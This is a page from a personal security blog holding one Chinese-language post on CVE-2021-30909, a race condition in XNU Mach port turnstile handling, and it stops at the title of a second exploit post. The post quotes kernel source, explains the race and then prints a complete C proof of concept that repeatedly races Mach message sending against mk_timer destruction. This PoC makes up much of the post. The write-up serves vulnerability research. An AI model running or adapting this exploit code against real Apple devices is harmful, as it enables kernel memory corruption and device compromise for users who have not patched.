<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="buffer0verflooow - Blog">
<meta property="og:url" content="https://buffer0verflooow.github.io/page/5/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="buffer0verflooow">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://buffer0verflooow.github.io/page/5/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/5/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">buffer0verflooow - Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/01/10/iOS-CVE-2021-30909/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/10/iOS-CVE-2021-30909/" class="post-title-link" itemprop="url">CVE-2021-30909</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-01-10 21:40:08" itemprop="dateCreated datePublished" datetime="2022-01-10T21:40:08+08:00">2022-01-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-01-21 22:01:19" itemprop="dateModified" datetime="2022-01-21T22:01:19+08:00">2022-01-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://www.cyberkl.com/cvelist/cvedetail/38">https://www.cyberkl.com/cvelist/cvedetail/38</a></p>
</blockquote>
<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>这个漏洞是在XNU Mach端口的预分配消息中的，Apple禁止从用户空间中构造预分配消息</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mach_port_allocate_full()</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t actually honor prealloc requests from user-space</span></span><br><span class="line"><span class="comment"> * (for security reasons, and because it isn&#x27;t guaranteed anyway).</span></span><br><span class="line"><span class="comment"> * Keep old errors for legacy reasons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (qosp-&gt;prealloc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (qosp-&gt;len &gt; MACH_MSG_SIZE_MAX - MAX_TRAILER_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (right != MACH_PORT_RIGHT_RECEIVE) &#123;</span><br><span class="line">        <span class="keyword">return</span> KERN_INVALID_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">    qosp-&gt;prealloc = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核不允许用户创建预分配消息端口，但是我们可以直接创建这种类型的端口。mk_timer就是这样的一个内核对象，它可以在用户空间访问，带有预分配消息的Mach端口。另一方面，即使是带着kobject集合的端口也仍然是正常的，因为它的接收者不是ipc_kernel。这就意味着，发往这些端口的消息将被推送到消息队列而不是内核。</p>
<p>导致这个漏洞的根本原因是，当从该端口获取转门（turnstile）对象时，该端口不被锁定。以ipc_port_send_update_inheritor()为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_port_send_update_inheritor</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span> port,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> turnstile *send_turnstile,</span></span><br><span class="line"><span class="params">	<span class="type">turnstile_update_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_mqueue_t</span> mqueue = &amp;port-&gt;ip_messages;</span><br><span class="line">	<span class="type">turnstile_inheritor_t</span> inheritor = TURNSTILE_INHERITOR_NULL;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">kn</span>;</span></span><br><span class="line">	<span class="type">turnstile_update_flags_t</span> inheritor_flags = TURNSTILE_INHERITOR_TURNSTILE;</span><br><span class="line"></span><br><span class="line">	imq_held(mqueue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ip_active(port)) &#123;</span><br><span class="line">		<span class="comment">/* this port is no longer active, it should not push anywhere */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_specialreply) &#123;</span><br><span class="line">		<span class="comment">/* Case 1. */</span></span><br><span class="line">		<span class="keyword">if</span> (port-&gt;ip_sync_bootstrap_checkin &amp;&amp; prioritize_launch) &#123;</span><br><span class="line">			inheritor = port-&gt;ip_messages.imq_srp_owner_thread;</span><br><span class="line">			inheritor_flags = TURNSTILE_INHERITOR_THREAD;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_receiver_name == MACH_PORT_NULL &amp;&amp;</span><br><span class="line">	    port-&gt;ip_destination != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="comment">/* Case 2. */</span></span><br><span class="line">		inheritor = port_send_turnstile(port-&gt;ip_destination);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ipc_port_watchport_elem(port) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="comment">/* Case 3. */</span></span><br><span class="line">		<span class="keyword">if</span> (prioritize_launch) &#123;</span><br><span class="line">			assert(port-&gt;ip_sync_link_state == PORT_SYNC_LINK_ANY);</span><br><span class="line">			inheritor = ipc_port_get_watchport_inheritor(port);</span><br><span class="line">			inheritor_flags = TURNSTILE_INHERITOR_THREAD;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_WORKLOOP_KNOTE) &#123;</span><br><span class="line">		<span class="comment">/* Case 4. */</span></span><br><span class="line">		inheritor = filt_ipc_kqueue_turnstile(mqueue-&gt;imq_inheritor_knote);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_WORKLOOP_STASH) &#123;</span><br><span class="line">		<span class="comment">/* Case 5. */</span></span><br><span class="line">		inheritor = mqueue-&gt;imq_inheritor_turnstile;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_RCV_THREAD) &#123;</span><br><span class="line">		<span class="comment">/* Case 6. */</span></span><br><span class="line">		<span class="keyword">if</span> (prioritize_launch) &#123;</span><br><span class="line">			inheritor = port-&gt;ip_messages.imq_inheritor_thread_ref;</span><br><span class="line">			inheritor_flags = TURNSTILE_INHERITOR_THREAD;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((kn = SLIST_FIRST(&amp;mqueue-&gt;imq_klist))) &#123;</span><br><span class="line">		<span class="comment">/* Case 7. Push on a workloop that is interested */</span></span><br><span class="line">		<span class="keyword">if</span> (filt_machport_kqueue_has_turnstile(kn)) &#123;</span><br><span class="line">			assert(port-&gt;ip_sync_link_state == PORT_SYNC_LINK_ANY);</span><br><span class="line">			inheritor = filt_ipc_kqueue_turnstile(kn);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	turnstile_update_inheritor(send_turnstile, inheritor,</span><br><span class="line">	    flags | inheritor_flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在case2 中，如果ip_receiver_name为空，并且ip_destination存在，将会从port-&gt;ip_destination（Mach端口）中获取一个turnstile对象。这样的话，如果当前端口的接收权限被发送给其他端口，XNU把这个接收者叫做ip_destination，内核将会从ip_destination中获取turnstile，而不是当前端口。</p>
<p>首先，目的端口的锁在这个时候没有被持有，这就给了我们一个机会去竞争释放目标端口的turnstile。但如果没有读过这个模块的代码，你会发现这毫无意义。因为当前的端口被绑定到destination，而你不能在当前端口的接收权还在destination的消息队列中时，释放destination的turnstile。</p>
<p>如果深入研究一下port_send_turnstile，我们发现一些有意思的东西：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> port_send_turnstile(port)   (IP_PREALLOC(port) ? (port)-&gt;ip_premsg-&gt;ikm_turnstile : (port)-&gt;ip_send_turnstile)</span></span><br></pre></td></tr></table></figure>

<p>IP_PREALLOC测试端口是否有预分配的消息，并分别获取turnstile。这是因为 ip_premsg和ip_send_turnstile共享同一个union。接下来，我们可以继续研究PREALLOC标志是如何对执行流程进行影响的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">IP_PREALLOC</span>(port)) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> inuse_port;</span><br><span class="line"></span><br><span class="line">		kmsg = port-&gt;ip_premsg;</span><br><span class="line">		<span class="built_in">assert</span>(kmsg != IKM_NULL);</span><br><span class="line">		inuse_port = <span class="built_in">ikm_prealloc_inuse_port</span>(kmsg);</span><br><span class="line">		<span class="built_in">ipc_kmsg_clear_prealloc</span>(kmsg, port);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">imq_lock</span>(&amp;port-&gt;ip_messages);</span><br><span class="line">		<span class="built_in">ipc_port_send_turnstile_recompute_push_locked</span>(port);</span><br><span class="line">		<span class="comment">/* mqueue and port unlocked */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (inuse_port != IP_NULL) &#123;</span><br><span class="line">			<span class="built_in">assert</span>(inuse_port == port);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">ipc_kmsg_free</span>(kmsg);</span><br><span class="line">		&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>在ipc_port_destroy()中，如果端口被设置为PREALLOC，那么 kmsg将被turnstile本身所取代。我们可以总结出一个竞争流程，如下：</p>
<ol>
<li>线程1执行port_send_turnstile，获取destination，并测试它是否真的是一个预分配的消息端口。</li>
<li>线程2执行ipc_kmsg_clear_prealloc()，并使用turnstile替换kmsg。</li>
<li>线程1从ip_premsg获取了turnstile，实际上是一个turnstile，这将导致一个turnstile在另一个turnstile中。</li>
</ol>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">mach_port_t</span> <span class="title function_">mk_timer_create</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">kern_return_t</span> <span class="title function_">mk_timer_destroy</span><span class="params">(<span class="type">mach_port_t</span> timer)</span>;</span><br><span class="line"><span class="type">mach_port_t</span> <span class="title function_">thread_get_special_reply_port</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">race_th_args_s</span> <span class="title">race_th_args_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">race_th_args_s</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">mach_port_t</span> move_port;</span><br><span class="line">    <span class="type">mach_port_t</span> sr_port;</span><br><span class="line">    <span class="type">mach_port_t</span> timer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">th_send_link</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">race_th_args_t</span> *rta = (<span class="type">race_th_args_t</span> *)arg;</span><br><span class="line">    <span class="keyword">while</span> (!rta-&gt;start);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span> header;</span><br><span class="line">        <span class="type">uint64_t</span> data;</span><br><span class="line">    &#125; link_sr_msg = &#123;</span><br><span class="line">        .header =</span><br><span class="line">            &#123;</span><br><span class="line">                .msgh_remote_port = rta-&gt;move_port,</span><br><span class="line">                .msgh_local_port = rta-&gt;sr_port,</span><br><span class="line">                .msgh_bits =</span><br><span class="line">                    MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">                .msgh_voucher_port = MACH_PORT_NULL,</span><br><span class="line">                .msgh_id = <span class="number">0x99999999</span>,</span><br><span class="line">                .msgh_size = <span class="keyword">sizeof</span>(link_sr_msg),</span><br><span class="line">            &#125;,</span><br><span class="line">        .data = <span class="number">0x6666666666666666</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">kern_return_t</span> __unused kr =</span><br><span class="line">        mach_msg(&amp;link_sr_msg.header,</span><br><span class="line">                 MACH_SEND_MSG | MACH_SEND_OVERRIDE | MACH_SEND_SYNC_OVERRIDE |</span><br><span class="line">                     MACH_SEND_SYNC_BOOTSTRAP_CHECKIN,</span><br><span class="line">                 <span class="keyword">sizeof</span>(link_sr_msg), <span class="number">0</span>, MACH_PORT_NULL, <span class="number">0</span>, MACH_PORT_NULL);</span><br><span class="line">    <span class="comment">/*assert(kr == KERN_SUCCESS);*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">th_destroy</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">race_th_args_t</span> *rta = (<span class="type">race_th_args_t</span> *)arg;</span><br><span class="line">    <span class="keyword">while</span> (!rta-&gt;start);</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">2</span>);</span><br><span class="line">    mk_timer_destroy(rta-&gt;timer);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">mach_port_t</span> timer = mk_timer_create();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] timer = 0x%x\n&quot;</span>, timer);</span><br><span class="line"></span><br><span class="line">        <span class="type">mach_port_t</span> move_port = MACH_PORT_NULL;</span><br><span class="line">        <span class="type">kern_return_t</span> kr =</span><br><span class="line">            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;move_port);</span><br><span class="line">        assert(kr == KERN_SUCCESS);</span><br><span class="line">        kr =</span><br><span class="line">            mach_port_insert_right(mach_task_self(), move_port, move_port, MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">        <span class="type">mach_port_t</span> sr_port = thread_get_special_reply_port();</span><br><span class="line">        <span class="comment">/*printf(&quot;[*] sr_port = 0x%x\n&quot;, sr_port);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">mach_msg_header_t</span> header;</span><br><span class="line">            <span class="type">mach_msg_body_t</span> body;</span><br><span class="line">            <span class="type">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">        &#125; move_right_msg = &#123;</span><br><span class="line">            .header =</span><br><span class="line">                &#123;</span><br><span class="line">                    .msgh_remote_port = timer,</span><br><span class="line">                    .msgh_local_port = MACH_PORT_NULL,</span><br><span class="line">                    .msgh_bits =</span><br><span class="line">                        MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, <span class="number">0</span>, <span class="number">0</span>, MACH_MSGH_BITS_COMPLEX),</span><br><span class="line">                    .msgh_voucher_port = MACH_PORT_NULL,</span><br><span class="line">                    .msgh_id = <span class="number">0x88888888</span>,</span><br><span class="line">                    .msgh_size = <span class="keyword">sizeof</span>(move_right_msg),</span><br><span class="line">                &#125;,</span><br><span class="line">            .body =</span><br><span class="line">                &#123;</span><br><span class="line">                    .msgh_descriptor_count = <span class="number">1</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            .port =</span><br><span class="line">                &#123;</span><br><span class="line">                    .name = move_port,</span><br><span class="line">                    .disposition = MACH_MSG_TYPE_MOVE_RECEIVE,</span><br><span class="line">                    .type = MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">                &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        kr = mach_msg(&amp;move_right_msg.header, MACH_SEND_MSG, <span class="keyword">sizeof</span>(move_right_msg), <span class="number">0</span>,</span><br><span class="line">                      MACH_PORT_NULL, <span class="number">0</span>, MACH_PORT_NULL);</span><br><span class="line">        assert(kr == KERN_SUCCESS);</span><br><span class="line"></span><br><span class="line">        <span class="type">race_th_args_t</span> rta = &#123;</span><br><span class="line">            .start = <span class="number">0</span>,</span><br><span class="line">            .move_port = move_port,</span><br><span class="line">            .sr_port = sr_port,</span><br><span class="line">            .timer = timer,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">pthread_t</span> ths[<span class="number">2</span>];</span><br><span class="line">        pthread_create(&amp;ths[<span class="number">0</span>], <span class="literal">NULL</span>, th_send_link, &amp;rta);</span><br><span class="line">        pthread_create(&amp;ths[<span class="number">1</span>], <span class="literal">NULL</span>, th_destroy, &amp;rta);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        rta.start = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            pthread_join(ths[i], <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mach_port_destroy(mach_task_self(), timer);</span><br><span class="line">        mach_port_destroy(mach_task_self(), move_port);</span><br><span class="line">        mach_port_destroy(mach_task_self(), sr_port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/01/05/CVE-2018-1000810-wildcopy-exploit/">

